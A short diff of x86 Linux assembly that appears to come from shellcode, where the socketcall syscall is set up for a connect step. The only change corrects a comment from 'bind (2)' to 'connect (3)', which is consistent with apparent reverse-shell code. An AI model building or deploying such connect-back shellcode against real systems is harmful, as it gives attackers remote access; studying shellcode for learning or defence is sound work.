@@ -33,7 +33,7 @@ _start:
 	push edi	 ; sockfd
 	
 	mov al, 0x66	 ; socketcall
-	mov bl, 0x3	 ; cmd = bind (2)
+	mov bl, 0x3	 ; cmd = connect (3)
 	lea ecx, [esp]
 	int 0x80
 
